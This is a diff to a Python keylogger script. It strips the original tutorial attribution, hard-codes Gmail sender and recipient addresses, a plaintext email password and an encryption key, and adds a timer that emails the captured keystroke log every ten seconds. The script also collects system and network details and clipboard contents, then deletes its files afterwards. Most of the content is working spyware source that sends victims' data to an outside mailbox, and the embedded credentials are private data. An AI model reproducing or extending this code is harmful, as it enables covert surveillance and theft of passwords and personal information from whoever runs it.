@@ -1,7 +1,3 @@
-# keylogger.py
-# Create an Advanced Keylogger in Python - Crash Course notes
-# Author: Grant Collins
-
 # Libraries
 
 from email.mime.multipart import MIMEMultipart
@@ -9,6 +5,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+import threading
 
 import socket
 import platform
@@ -45,16 +42,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
+email_address = "moneyyo383@gmail.com" # Enter disposable email here
+password = "moneyyo@gmail.com" # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = " " # Enter the email address you want to send your information to
+toaddr = "sainikhil1885007@gmail.com" # Enter the email address you want to send your information to
 
-key = " " # Generate an encryption key from the Cryptography folder
+key = "CqoD0uPLy4ffaQCRlTSAcKDO1yumiTljvQEWPb0n8P0=" # Generate an encryption key from the Cryptography folder
 
-file_path = " " # Enter the file path you want your files to be saved to
+file_path = "C:\\Users\\Itachi\\Desktop\\python-advanced-keylogger\\python-advanced-keylogger\\Cryptography" # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
@@ -100,7 +97,15 @@ def send_email(filename, attachment, toaddr):
 
     s.quit()
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
+def trigger(*args):
+    send_email(*args)
+    t = threading.Timer(10, trigger, args)
+    t.start()
+
+t = threading.Timer(10, trigger, [keys_information, file_path + extend + keys_information, toaddr])
+t.start()
+
+#send_email(keys_information, file_merge + keys_information, toaddr)
 
 # get the computer information
 def computer_information():
@@ -121,7 +126,6 @@ def computer_information():
         f.write("Private IP Address: " + IPAddr + "\n")
 
 computer_information()
-
 # get the clipboard contents
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
@@ -239,4 +243,3 @@ time.sleep(120)
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
-
